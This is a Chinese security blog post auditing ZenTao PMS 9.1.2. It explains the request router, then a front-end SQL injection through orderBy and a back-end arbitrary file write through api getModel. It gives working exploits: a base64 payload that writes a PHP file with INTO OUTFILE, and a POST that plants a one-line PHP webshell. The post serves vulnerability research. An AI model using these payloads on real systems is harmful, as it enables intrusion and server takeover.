---
title: 禅道pms-路由及漏洞分析
tags:
  - 代码审计
  - 漏洞分析
  - php
date: 2018-09-26 13:34:59
---

> 文章首发安全客 https://www.anquanke.com/

# 路由分析

路由是分析和审计cms前一个很重要的点，能了解整个cms的基本框架和代码流程。

禅道各个版本中路由都没有什么较大的变化，这里以9.1.2为例进行分析。



首先，禅道里有两种类型的路由，分别对应者两种不同的url访问方式

- PATHINFO：`user-login-L3plbnRhb3BtczEwLjMuMS93d3cv.html`   以伪静态形式在html名称中传参
- GET：`index.php?m=block&f=main&mode=getblockdata`  类似于其他常规cms在get参数中传参

## index.php

![](禅道pms-路由及漏洞分析\1.png)

贴代码太多了，就放张图片好了。

一开始是加载了一些框架的类，然后new了一个路由

```php
$app = router::createApp('pms', dirname(dirname(__FILE__)), 'router');
```

然后做了一些简单的判断和是否安装，最主要的是最后的三行

```php
$app->parseRequest();
$common->checkPriv();
$app->loadModule();
```

看方法名也大致能猜到是干嘛了，分别对应着`参数解析`、`权限检测`、`模块加载`



## router.class.php

路由的代码文件在`\framework\base\router.class.php`中

```php
public function parseRequest()
{
    if(isGetUrl())
    {
        if($this->config->requestType == 'PATH_INFO2') define('FIX_PATH_INFO2', true);
        $this->config->requestType = 'GET';
    }

    if($this->config->requestType == 'PATH_INFO' or $this->config->requestType == 'PATH_INFO2')
    {
        $this->parsePathInfo();
        $this->setRouteByPathInfo();
    }
    elseif($this->config->requestType == 'GET')
    {
        $this->parseGET();
        $this->setRouteByGET();
    }
    else
    {
        $this->triggerError("The request type {$this->config->requestType} not supported", __FILE__, __LINE__, $exit = true);
    }
}
```

一开始的`isGetUrl`就会判断是那种类型的传参方式

```php
function isGetUrl()
{
    $webRoot = getWebRoot();
    if(strpos($_SERVER['REQUEST_URI'], "{$webRoot}?") === 0) return true;
    if(strpos($_SERVER['REQUEST_URI'], "{$webRoot}index.php?") === 0) return true;
    if(strpos($_SERVER['REQUEST_URI'], "{$webRoot}index.php/?") === 0) return true;
    return false;
}
```

然后就以对应的方式进行参数解析，完成`router`中三个主要元素的加载

- `moduleName` 模块名称
- `methodName`方法名称
- `controlFile` 控制文件



解析完参数之后就是返回`index.php`然后权限检测，再进入`loadMoulde`加载模块

通过动态调试以及注释可以看到，一开始是设置了模块名、方法名一些参数，并创建了`control`控制器实例

![](禅道pms-路由及漏洞分析\2.png)

之后就是根据`GET`或者`PATHINFO`的形式获取参数

![](禅道pms-路由及漏洞分析\3.png)

全部准备工作做好之后就进入

```php
call_user_func_array(array($module, $methodName), $this->params);
```

进行动态方法调用，调用`/module/xxx/control.php`中的`xxx`函数

例如我这里传入的url是`index.php?m=block&f=main&mode=getblockdata&blockid=case`

就会进入到`/module/block/control.php`中的`public function main`函数中，并传入对应的参数

这样就结束了路由的解析，正式进入到逻辑函数的处理

不同的url会对应到不同的文件的不同函数中，这也正是路由的功能

明白了如何禅道中是如何进行路由配置的，也就更容易理解整个框架，从而进行分析。



# 前台SQL注入

漏洞一开始爆出是在9.1.2版本，后续几个版本似乎进行了过滤，但是过滤不完全，依旧有注入的危险

测试版本为9.1.2

## 漏洞分析

漏洞发生在sql类的核心库文件中`lib/base/dao/dao.class.php:1915`

```php
public function orderBy($order)
{
    if($this->inCondition and !$this->conditionIsTrue) return $this;

    $order = str_replace(array('|', '', '_'), ' ', $order);

    /* Add "`" in order string. */
    /* When order has limit string. */
    $pos    = stripos($order, 'limit');
    $orders = $pos ? substr($order, 0, $pos) : $order;
    $limit  = $pos ? substr($order, $pos) : '';
    $orders = trim($orders);
    if(empty($orders)) return $this;
    if(!preg_match('/^(\w+\.)?(`\w+`|\w+)( +(desc|asc))?( *(, *(\w+\.)?(`\w+`|\w+)( +(desc|asc))?)?)*$/i', $orders)) die("Order is bad request, The order is $orders");

    $orders = explode(',', $orders);
    foreach($orders as $i => $order)
    {
        $orderParse = explode(' ', trim($order));
        foreach($orderParse as $key => $value)
        {
            $value = trim($value);
            if(empty($value) or strtolower($value) == 'desc' or strtolower($value) == 'asc') continue;

            $field = $value;
            /* such as t1.id field. */
            if(strpos($value, '.') !== false) list($table, $field) = explode('.', $field);
            if(strpos($field, '`') === false) $field = "`$field`";

            $orderParse[$key] = isset($table) ? $table . '.' . $field :  $field;
            unset($table);
        }
        $orders[$i] = join(' ', $orderParse);
        if(empty($orders[$i])) unset($orders[$i]);
    }
    $order = join(',', $orders) . ' ' . $limit;

    $this->sql .= ' ' . DAO::ORDERBY . " $order";
    return $this;
}
```

在最后的语句拼接处可以看到，对`$limit`变量直接进行了拼接，而且前面也没有进行严格的过滤于判断

```php
$order = join(',', $orders) . ' ' . $limit;
```

然后漏洞发现者找了个调用这个`orderby`方法的地方

在访问`index.php?m=block&f=main&mode=getblockdata&blockid=case`时就会进入`module/block/control.php:296`的main函数部分

然后进入`getblockdata`分支，对传入的`param`参数进行解码，然后赋值给$this->params

```php
$params = $this->get->param;
$params = json_decode(base64_decode($params));
...
    $this->params      = $params;
```

最后会调用到`printCaseBlock`方法

![](禅道pms-路由及漏洞分析\4.png)

`printCaseBlock`中`openedbyme`分支会对传入的`$this->params->orderBy`带入到`orderBy`函数中

![](禅道pms-路由及漏洞分析\5.png)

由于没有进行严格的限制，从而拼接之后执行，造成了sql注入

## 漏洞利用

假如是root权限，就可以利用pdo的多段查询，直接导出数据，生成php文件，从而getshell

访问url

```
index.php?m=block&f=main&mode=getblockdata&blockid=case&param=eyJvcmRlckJ5Ijoib3JkZXIgbGltaXQgMSwxO3NlbGVjdCAnPD9waHAgcGhwaW5mbycgaW50byBvdXRmaWxlICdkOi9lLnBocCcjIiwibnVtIjoiMSwxIiwidHlwZSI6Im9wZW5lZGJ5bWUifQ==
```

在`referrer`中添加`http://localhost/`或者就是你访问的网页url

param参数为一段json的base64编码解码之后就是

```
{"orderBy":"order limit 1,1;select '<?php phpinfo' into outfile 'd:/e.php'#","num":"1,1","type":"openedbyme"}
```

修改`select '<?php phpinfo' into outfile 'd:/e.php'`部分数据就可以执行想要的sql语句

![](禅道pms-路由及漏洞分析\1.gif)



假如权限不够的时候，就可以利用一些报错或者盲注的方式，由于PDO的原因，会相对来的比较复杂

柠檬师傅的[文章](https://www.cnblogs.com/iamstudy/articles/chandao_pentest_1.html)中写的很详细了，就不班门弄斧了



# 后台getshell

测试版本为9.1.2

## 漏洞分析

问题出现在`module/api/control.php:38`的`getModel`函数中

```php
public function getModel($moduleName, $methodName, $params = '')
{
    parse_str(str_replace(',', '&', $params), $params);
    $module = $this->loadModel($moduleName);
    $result = call_user_func_array(array(&$module, $methodName), $params);
    if(dao::isError()) die(json_encode(dao::getError()));
    $output['status'] = $result ? 'success' : 'fail';
    $output['data']   = json_encode($result);
    $output['md5']    = md5($output['data']);
    $this->output     = json_encode($output);
    die($this->output);
}
```

在第三行里面使用了回调函数，而传入的参数正好就是通过get方式传入的，导致了参数的可控

```php
$result = call_user_func_array(array(&$module, $methodName), $params);
```



这里需要一个找一个文件写入的点，然后调用就可以了，于是可以来到`module/editor/model.php:371`

```php
public function save($filePath)
{
    $fileContent = $this->post->fileContent;
    $evils       = array('eval', 'exec', 'passthru', 'proc_open', 'shell_exec', 'system', '$$', 'include', 'require', 'assert');
    $gibbedEvils = array('e v a l', 'e x e c', ' p a s s t h r u', ' p r o c _ o p e n', 's h e l l _ e x e c', 's y s t e m', '$ $', 'i n c l u d e', 'r e q u i r e', 'a s s e r t');
    $fileContent = str_ireplace($gibbedEvils, $evils, $fileContent);
    if(get_magic_quotes_gpc()) $fileContent = stripslashes($fileContent);

    $dirPath = dirname($filePath);
    $extFilePath = substr($filePath, 0, strpos($filePath, DS . 'ext' . DS) + 4);
    if(!is_dir($dirPath) and is_writable($extFilePath)) mkdir($dirPath, 0777, true);
    if(is_writable($dirPath))
    {
        file_put_contents($filePath, $fileContent);
    }
    else
    {
        die(js::alert($this->lang->editor->notWritable . $extFilePath));
    }
}
```

可以看到这里虽然做了一些简单字符的过滤，但是丝毫不影响写入shell

只要在api处调用这个函数即可任意文件写入，从而getshell

## 漏洞利用

这是一个后台的洞，所以需要登录到后台

之后访问如下url

```url
localhost/zentaopms912/www/index.php
?m=api
&f=getModel
&moduleName=editor&methodName=save
&params=filePath=../e.php
```

POST中传入

```
fileContent=<?php $_POST[_]($_POST[1]);
```

就会在`www`目录下生成1.php文件

![](禅道pms-路由及漏洞分析\6.png)

getshell

![](禅道pms-路由及漏洞分析\7.png)







# Reference Links

https://www.cnblogs.com/iamstudy/articles/chandao_pentest_1.html

http://seaii-blog.com/index.php/2018/07/02/83.html